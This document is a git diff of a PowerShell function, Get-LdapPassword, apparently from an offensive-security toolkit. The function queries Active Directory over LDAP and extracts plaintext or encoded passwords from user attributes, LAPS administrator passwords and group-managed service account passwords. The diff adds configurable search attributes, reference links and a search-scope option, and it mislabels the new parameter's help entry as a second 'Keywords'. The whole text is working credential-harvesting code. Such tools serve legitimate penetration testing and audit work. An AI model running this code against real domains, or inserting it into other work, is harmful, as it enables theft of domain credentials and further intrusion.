@@ -3,10 +3,10 @@ function Get-LdapPassword {
 .SYNOPSIS
     Retrieve plaintext passwords from Active Directory.
 
-    Author: Timothee MENOCHET (@TiM0)
+    Author: Timothee MENOCHET (@_tmenochet)
 
 .DESCRIPTION
-    Get-LdapPassword queries domain controller via LDAP protocol for accounts with sensitive data in Description attribute and common attributes containing passwords (UnixUserPassword, UserPassword, msSFU30Password, unicodePwd, ms-MCS-AdmPwd or msDS-ManagedPassword).
+    Get-LdapPassword queries domain controller via LDAP protocol for accounts with common attributes containing passwords (UnixUserPassword, UserPassword, ms-MCS-AdmPwd, msDS-ManagedPassword and more).
 
 .PARAMETER Server
     Specifies the domain controller to query.
@@ -15,13 +15,16 @@ function Get-LdapPassword {
     Specify the domain account to use.
 
 .PARAMETER Keywords
+    Specify specific attributes to search through.
+
+.PARAMETER Keywords
     Specify specific keywords to search for.
 
 .EXAMPLE
     PS C:\> Get-LdapPassword -Server ADATUM.CORP -Credential ADATUM\testuser
 
 .EXAMPLE
-    PS C:\> Get-LdapPassword -Server ADATUM.CORP -Keywords pw,mdp
+    PS C:\> Get-LdapPassword -Server ADATUM.CORP -Attributes description,comment -Keywords pw,mdp
 #>
 
     [CmdletBinding()]
@@ -37,6 +40,10 @@ function Get-LdapPassword {
 
         [ValidateNotNullOrEmpty()]
         [String[]]
+        $Attributes = @("description"),
+
+        [ValidateNotNullOrEmpty()]
+        [String[]]
         $Keywords = @("cred", "pass", "pw")
     )
 
@@ -45,31 +52,35 @@ function Get-LdapPassword {
     $rootDN = $domainObject.rootDomainNamingContext[0]
     $ADSpath = "LDAP://$Server/$rootDN"
 
-    # Search for passwords in description attribute
+    # Searching for password in world-readable attributes
     $filter = $null
-    ForEach ($keyword in $Keywords) {
-        $filter += "(description=*$keyword*)"
+    ForEach ($attribute in $Attributes) {
+        ForEach ($keyword in $Keywords) {
+            $filter += "($attribute=*$keyword*)"
+        }
     }
     $filter = "(&(objectClass=user)(|$filter))"
-    $accounts = Get-LdapObject -ADSpath $ADSpath -Filter $filter -Properties samAccountName,description -Credential $Credential
+    $accounts = Get-LdapObject -ADSpath $ADSpath -Filter $filter -Credential $Credential
     ForEach ($account in $accounts) {
-        if ($account.description) {
-            $password = $account.description
-            $result = New-Object PSObject                                       
-            $result | Add-Member Noteproperty SamAccountName $account.sAMAccountName
-            $result | Add-Member Noteproperty Attribute 'Description'
-            $result | Add-Member Noteproperty Value $password
-            $result
+        ForEach ($attribute in $attributes) {
+            if ($account.$attribute) {
+                $result = New-Object PSObject 
+                $result | Add-Member Noteproperty SamAccountName $account.sAMAccountName
+                $result | Add-Member Noteproperty Attribute $attribute
+                $result | Add-Member Noteproperty Value $account.$attribute
+                $result
+            }
         }
     }
 
-    # Search for encoded password attributes
-    $filter = "(&(objectClass=user)(|(UnixUserPassword=*)(UserPassword=*)(msSFU30Password=*)(unicodePwd=*)(ms-MCS-AdmPwd=*)))"
+    # Searching for encoded password attributes
+    # Reference: https://www.blackhillsinfosec.com/domain-goodness-learned-love-ad-explorer/
+    $filter = "(&(objectClass=user)(|(UnixUserPassword=*)(UserPassword=*)(msSFU30Password=*)(unicodePwd=*)))"
     $accounts = Get-LdapObject -ADSpath $ADSpath -Filter $filter -Credential $Credential
     ForEach ($account in $accounts) {
         if ($account.UnixUserPassword) {
             $password = [System.Text.Encoding]::ASCII.GetString($account.UnixUserPassword)
-            $result = New-Object PSObject                                       
+            $result = New-Object PSObject 
             $result | Add-Member Noteproperty SamAccountName $account.sAMAccountName
             $result | Add-Member Noteproperty Attribute 'UnixUserPassword'
             $result | Add-Member Noteproperty Value $password
@@ -77,7 +88,7 @@ function Get-LdapPassword {
         }
         if ($account.UserPassword) {
             $password = [System.Text.Encoding]::ASCII.GetString($account.UserPassword)
-            $result = New-Object PSObject                                       
+            $result = New-Object PSObject
             $result | Add-Member Noteproperty SamAccountName $account.sAMAccountName
             $result | Add-Member Noteproperty Attribute 'UserPassword'
             $result | Add-Member Noteproperty Value $password
@@ -85,7 +96,7 @@ function Get-LdapPassword {
         }
         if ($account.msSFU30Password) {
             $password = [System.Text.Encoding]::ASCII.GetString($account.msSFU30Password)
-            $result = New-Object PSObject                                       
+            $result = New-Object PSObject
             $result | Add-Member Noteproperty SamAccountName $account.sAMAccountName
             $result | Add-Member Noteproperty Attribute 'msSFU30Password'
             $result | Add-Member Noteproperty Value $password
@@ -93,7 +104,7 @@ function Get-LdapPassword {
         }
         if ($account.unicodePwd) {
             $password = [System.Text.Encoding]::ASCII.GetString($account.unicodePwd)
-            $result = New-Object PSObject                                       
+            $result = New-Object PSObject
             $result | Add-Member Noteproperty SamAccountName $account.sAMAccountName
             $result | Add-Member Noteproperty Attribute 'unicodePwd'
             $result | Add-Member Noteproperty Value $password
@@ -101,7 +112,8 @@ function Get-LdapPassword {
         }
     }
 
-    # Search for LAPS passwords
+    # Searching for LAPS passwords
+    # Reference: https://adsecurity.org/?p=1790
     $filter = "(&(objectCategory=Computer)(ms-MCS-AdmPwd=*))"
     $accounts = Get-LdapObject -ADSpath $ADSpath -Filter $filter -Credential $Credential
     ForEach ($account in $accounts) {
@@ -121,7 +133,8 @@ function Get-LdapPassword {
         }
     }
 
-    # Search for GMSA passwords
+    # Searching for GMSA passwords
+    # Reference: https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/
     $filter = "(&(objectClass=msDS-GroupManagedServiceAccount)(msDS-ManagedPasswordId=*))"
     $accounts = Get-LdapObject -ADSpath $ADSpath -Filter $filter -Credential $Credential
     ForEach ($account in $accounts) {
@@ -143,10 +156,13 @@ function Local:Get-LdapObject {
         [String]
         $ADSpath,
 
-        [Parameter(Mandatory=$true)]
         [ValidateNotNullOrEmpty()]
         [String]
-        $Filter,
+        $SearchScope = 'Subtree',
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $Filter = '(objectClass=*)',
 
         [ValidateNotNullOrEmpty()]
         [String[]]
@@ -169,6 +185,7 @@ function Local:Get-LdapObject {
     else {
         $searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$ADSpath)
     }
+    $searcher.SearchScope = $SearchScope
     $searcher.PageSize = $PageSize
     $searcher.CacheResults = $false
     $searcher.filter = $Filter
